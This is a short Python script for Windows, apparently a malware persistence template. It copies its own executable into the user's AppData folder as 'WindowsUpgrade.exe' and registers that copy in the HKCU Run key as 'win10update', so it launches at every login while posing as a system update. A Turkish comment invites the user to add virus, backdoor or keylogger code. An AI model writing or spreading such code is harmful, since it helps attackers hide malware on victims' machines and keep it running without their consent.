import subprocess 
import os
import sys 
import shutil  

def add_to_registry():
    new_file=os.environ["appdata"] + "\\WindowsUpgrade.exe" 
    if not os.path.exists(new_file): 
        shutil.copyfile(sys.executable,new_file)  
        regadress="reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v win10update /t REG_SZ /d " + new_file   
        subprocess.call(regadress,shell=True)

add_to_registry()


#Virüs kodlarınızı , backdoor , keyloger vb. kodlarınızı giriniz.